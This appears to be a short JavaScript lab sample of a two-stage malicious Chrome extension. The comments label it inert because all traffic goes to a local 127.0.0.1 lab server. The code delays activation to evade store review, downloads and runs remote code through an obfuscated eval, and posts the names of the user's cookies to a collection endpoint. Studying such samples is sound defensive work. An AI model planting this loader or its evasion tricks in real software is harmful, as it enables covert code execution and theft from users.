// PENT-02 lab sample (two-stage loader). INERT: every URL is the local lab
// server on 127.0.0.1, which does not exist unless you start one yourself.
const LAB = "http://127.0.0.1:8765";

// Stage 1 stays quiet at install time and waits for an alarm (store review
// would see nothing happen).
chrome.alarms.create("check", { delayInMinutes: 60 });

chrome.alarms.onAlarm.addListener(async () => {
  // Stage 2: download code and run it. The name of eval is split so that a
  // naive text search for "eval(" misses it.
  const response = await fetch(LAB + "/stage2.js");
  const payload = await response.text();
  self["ev" + "al"](payload);

  // Send cookie names to the lab server (exfiltration pattern).
  const cookies = await chrome.cookies.getAll({});
  fetch(LAB + "/collect", {
    method: "POST",
    body: JSON.stringify(cookies.map((c) => c.name)),
  });
});
